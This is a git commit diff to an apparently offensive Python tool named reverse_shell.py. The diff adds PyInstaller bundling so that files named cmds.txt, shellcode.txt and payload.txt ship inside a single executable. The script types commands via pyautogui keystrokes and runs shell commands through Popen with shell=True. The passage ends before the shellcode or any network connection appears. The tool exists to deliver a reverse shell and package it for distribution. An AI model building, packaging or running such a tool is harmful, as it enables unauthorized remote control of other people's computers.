ae083d25758ec3e0b37c9c63336a35834d00f4c9
0Reab <122540000+0Reab@users.noreply.github.com>
2024-12-09 20:12:33 +0100

    Update script

--- reverse_shell.py
+++ reverse_shell.py
@@ -1,16 +1,32 @@
 from subprocess import Popen
 from pyautogui import write, press
 from time import sleep
+import os
+import sys
+
+# pyinstaller --onefile --add-data "cmds.txt;." --add-data "shellcode.txt;." --add-data "payload.txt;." reverse_shell.py
 
 # consts
 run = lambda string: Popen(string, shell=True) # subprocess create
 enter = lambda: press('enter') # enter() key press
 sec = 1.5 # delay
 
+def resource_path(relative_path):
+    """Get absolute path to resource, works for pyinstaller."""
+    try:
+        # for pyinstaller
+        base_path = sys._MEIPASS
+    except AttributeError:
+        # running as a script
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
+
 # file reading func
 def read(file):
-    with open(file, 'r') as f:
+    with open(resource_path(file), 'r') as f:
         return f.read()
+
 
 # read payloads
 prep_cmds = read('cmds.txt')
